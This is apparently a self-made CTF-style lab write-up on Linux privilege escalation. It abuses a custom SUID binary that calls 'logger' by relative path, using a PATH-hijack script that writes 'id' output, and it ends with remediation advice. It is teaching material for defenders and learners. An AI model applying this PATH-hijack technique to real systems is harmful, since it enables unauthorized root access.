# Linux Privilege Escalation — SUID Misconfiguration

**Category:** Privilege Escalation  
**Technique:** SUID Abuse  
**Difficulty:** Medium  
**Type:** Self-Created Practice Lab

> This is an original CTF-style practice scenario created for learning. It is not an official RingZer0 challenge and does not represent a real solved challenge or achievement.

## Challenge

A low-privileged user has access to a Linux host. The objective is to identify a misconfigured SUID executable and use it to demonstrate local privilege escalation.

The lab is designed around a common Linux security weakness: a privileged executable invoking another program without using a safe absolute path.

## Reconnaissance / Analysis

After obtaining a shell as the low-privileged user, the first step is to identify the current account and system information.

```bash
whoami
id
uname -a
```

The next step is to enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The output contains the normal system SUID programs as well as an unusual custom binary:

```text
/usr/local/bin/report-check
```

Because `/usr/local/bin/report-check` is not part of a typical minimal Linux installation, it is worth investigating further.

## Vulnerability / Technique

The binary has the SUID permission bit enabled, meaning it executes with the privileges of its file owner rather than the privileges of the user launching it.

The permissions can be checked with:

```bash
ls -l /usr/local/bin/report-check
```

Example output:

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/report-check
```

The important part is the `s` in the owner's execute position:

```text
-rwsr-xr-x
   ^
  SUID
```

Further analysis of the executable shows that it launches a helper command using a relative command name instead of a fixed absolute path.

For example, the vulnerable logic is conceptually similar to:

```c
system("logger report check complete");
```

If the privileged program relies on the user's `PATH`, a malicious executable with the same name as the expected helper can potentially be executed first.

## Exploitation / Solution

First, inspect the binary and its linked libraries:

```bash
file /usr/local/bin/report-check
strings /usr/local/bin/report-check | less
```

A useful next check is to observe which external programs the binary attempts to execute:

```bash
strace -f /usr/local/bin/report-check 2>&1 | grep -E 'execve|logger'
```

If the helper is resolved through `PATH`, create a controlled replacement in a writable directory.

Example lab payload:

```bash
mkdir -p /tmp/lab
cat > /tmp/lab/logger << 'EOF'
#!/bin/sh
id > /tmp/suid-result.txt
EOF
chmod +x /tmp/lab/logger
```

Prepend the controlled directory to `PATH`:

```bash
export PATH=/tmp/lab:$PATH
```

Then execute the SUID program:

```bash
/usr/local/bin/report-check
```

The replacement helper executes with the privileges inherited from the SUID program. In the lab, the resulting file can be checked with:

```bash
cat /tmp/suid-result.txt
```

The expected observation is that the command ran with the privileged identity of the SUID executable's owner.

## Result

The lab demonstrates a local privilege-escalation path caused by the combination of:

```text
SUID binary
     ↓
Privileged execution
     ↓
Unsafe relative command lookup
     ↓
PATH manipulation
     ↓
Attacker-controlled helper execution
```

No real credentials, secrets, or production systems are involved in this scenario.

## Key Commands

```bash
id
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/local/bin/report-check
file /usr/local/bin/report-check
strings /usr/local/bin/report-check
strace -f /usr/local/bin/report-check 2>&1 | grep execve
```

## Lessons Learned

- SUID binaries should always be reviewed carefully during Linux privilege-escalation enumeration.
- Custom binaries in `/usr/local/bin` deserve additional investigation.
- Privileged programs should not trust an unprivileged user's `PATH`.
- External commands should be invoked using controlled absolute paths where appropriate.
- `strings`, `file`, and `strace` can provide useful initial visibility into unfamiliar binaries.
- File permissions alone do not explain the complete attack path; the behavior of the privileged program must also be analyzed.

## Remediation

The vulnerable application should avoid resolving privileged helper programs through an attacker-controlled `PATH`.

A safer implementation would use a trusted absolute path and carefully controlled execution environment. The SUID bit should also be removed if it is not strictly required:

```bash
chmod u-s /usr/local/bin/report-check
```

The principle of least privilege should be applied so that custom programs receive only the privileges they actually require.

## Conclusion

This practice lab demonstrates how a SUID executable combined with unsafe command resolution can create a local privilege-escalation opportunity.

The important takeaway is that privilege escalation is often caused by the interaction between **file permissions, program behavior, and environment variables**, rather than by a single permission setting alone.
